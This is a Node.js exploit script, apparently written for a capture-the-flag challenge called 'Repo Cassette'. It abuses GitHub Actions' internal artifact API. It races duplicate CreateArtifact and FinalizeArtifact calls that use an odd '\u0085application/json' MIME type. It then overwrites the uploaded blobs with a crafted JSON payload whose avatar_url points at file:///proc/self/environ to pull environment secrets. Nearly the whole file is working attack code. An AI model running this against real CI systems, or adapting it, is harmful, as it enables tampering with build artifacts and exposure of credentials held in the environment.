import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const oddJsonMime = '\u0085application/json';
const repository = process.env.GITHUB_REPOSITORY;
if (!repository) throw new Error('GITHUB_REPOSITORY is missing');

function payload(artifactId) {
  return Buffer.from(JSON.stringify({
    full_name: `${repository}/actions/artifacts/${artifactId}/zip`,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: 'Repo Cassette CTF artifact',
    stargazers_count: 0,
  }));
}

async function create(name, version, mimeType) {
  const result = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({ value: mimeType }),
  });
  if (!result.ok) throw new Error('CreateArtifact returned ok=false');
  return result;
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: { blobContentType: oddJsonMime },
  });
}

async function finalize(name, bytes) {
  const hash = createHash('sha256').update(bytes).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(bytes.length),
    hash: StringValue.create({ value: `sha256:${hash}` }),
  });
  if (!result.ok) throw new Error('FinalizeArtifact returned ok=false');
  return String(result.artifactId);
}

async function race(index) {
  const name = `repo-cassette-race-${index}-${Date.now()}`;
  const specs = index % 2 === 0
    ? [[6, oddJsonMime], [7, 'application/json']]
    : [[7, 'application/json'], [6, oddJsonMime]];
  const created = await Promise.all(specs.map(([version, mime]) => create(name, version, mime)));
  const placeholder = Buffer.from('{"probe":"placeholder"}');
  await Promise.all(created.map(item => upload(item.signedUploadUrl, placeholder)));

  const finalized = await Promise.allSettled([
    finalize(name, placeholder),
    finalize(name, placeholder),
  ]);
  const artifactIds = [...new Set(finalized
    .filter(result => result.status === 'fulfilled')
    .map(result => result.value))];
  if (!artifactIds.length) throw new Error('Both FinalizeArtifact calls failed');

  for (const artifactId of artifactIds) {
    const body = payload(artifactId);
    await Promise.all(created.map(item => upload(item.signedUploadUrl, body)));
  }

  console.log(`BUILT ${JSON.stringify({ name, artifactIds, repository: `${repository}/actions/artifacts/${artifactIds.at(-1)}/zip` })}`);
}

const count = Number.parseInt(process.env.RACE_COUNT ?? '48', 10);
if (!Number.isInteger(count) || count < 1 || count > 64) {
  throw new Error('RACE_COUNT must be an integer from 1 to 64');
}

for (let index = 0; index < count; index += 1) {
  try {
    await race(index);
  } catch (error) {
    console.log(`SKIPPED ${index}: ${error.message}`);
  }
}
